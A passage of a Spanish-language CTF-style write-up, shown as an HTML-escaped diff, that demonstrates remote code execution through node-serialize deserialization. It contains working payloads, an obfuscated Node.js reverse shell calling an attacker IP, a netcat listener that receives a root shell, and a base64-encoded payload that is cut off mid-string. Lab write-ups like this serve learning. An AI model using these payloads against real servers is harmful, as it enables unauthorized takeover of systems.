+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rce&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;_&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ND_FUNC&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_function(){&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  }&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos arroja los datos serializados (parcialmente, ya que contiene &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt; que hay que eliminar). Sin embargo, no vemos que nos aplique comandos a nivel de sistema. Continuando leyendo, el autor nos dice que al final de body, al agregar &lt;strong&gt;()&lt;/strong&gt;, logramos que se ejecute el comando, para este caso es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;rce&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;ls /&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}(),&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;node-serialize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Serialized: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ node serialize.js
+Serialized: 
+&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+keybase
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sandbox
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+zsh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos ejecución de comandos a nivel de sistema. Por lo tanto, debemos crear el archivo &lt;strong&gt;unserialize.js&lt;/strong&gt; para ver el efecto que tendría de lado del servidor (víctima):&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;node-serialize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;).exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;ls /&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;,function(error, stdout, stderr) { console.log(stdout)});}()&quot;}&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al ejecutarlo, vemos lo mismo que el resultado anterior, sin embargo, debemos tener en cuenta que el contenido &lt;strong&gt;unserialize.js&lt;/strong&gt; sería similar al que se tiene del lado del servidor y que logramos ejecución de comandos a nivel de sistema. Para trabajar más cómodos, el autor del documento, nos proporciona un script en python para obtener una reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
+&lt;span class=&quot;nt&quot;&gt;--2022-03-16&lt;/span&gt; 23:21:49--  https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
+Resolviendo raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
+Conectando con raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)[&lt;/span&gt;185.199.109.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 1575 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.5K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/plain]
+Grabando a: «nodejsshell.py»
+
+nodejsshell.py                   100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;   1.54K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    en 0s      
+
+2022-03-16 23:21:49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18.3 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - «nodejsshell.py» guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1575/1575]
+❯ python2 nodejsshell.py
+Usage: nodejsshell.py &amp;lt;LHOST&amp;gt; &amp;lt;LPORT&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo ejecutamos con los valores que nos solicita:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python2 nodejsshell.py 10.10.14.27 443
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] LHOST &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10.10.14.27
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] LPORT &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 443
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Encoding
+&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;String.fromCharCode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,50,55,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Copiamos el resultado que nos arroja y lo pegamos en el recurso &lt;strong&gt;unserialize.js&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;node-serialize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,50,55,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()&quot;}&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo ejecutamos y nos ponemos en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ node unserialize.js
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] 34424
+Connected!
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hemos logrado obtener una conexión (de nosotros mismos). Ahora con el concepto en mente, vamos a hacerlo en la máquina víctima; por lo tanto vamos quedarnos con la siguiente cadena de texto:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rce&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;_&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ND_FUNC&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,50,55,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ciframos la cadena en base 64:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 0
+eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNDgsNDYsNDksNDgsNDYsNDksNTIsNDYsNTAsNTUsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNTIsNTIsNTEsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMD